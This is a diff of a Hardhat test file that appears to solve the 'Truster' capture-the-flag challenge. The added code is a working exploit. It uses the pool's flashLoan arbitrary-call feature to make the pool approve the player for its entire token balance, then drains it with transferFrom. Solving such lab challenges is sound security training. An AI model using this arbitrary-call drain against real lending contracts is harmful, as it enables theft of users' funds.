@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Truster', function () {
+describe.only('[Challenge] Truster', function () {
     let deployer, player;
     let token, pool;
 
@@ -23,6 +23,18 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        await pool.flashLoan(
+          0,
+          player.address,
+          token.address,
+          token.interface.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL])
+        )
+
+        await token.connect(player).transferFrom(
+          pool.address,
+          player.address,
+          TOKENS_IN_POOL
+        )
     });
 
     after(async function () {
@@ -37,4 +49,3 @@ describe('[Challenge] Truster', function () {
         ).to.equal(0);
     });
 });
-
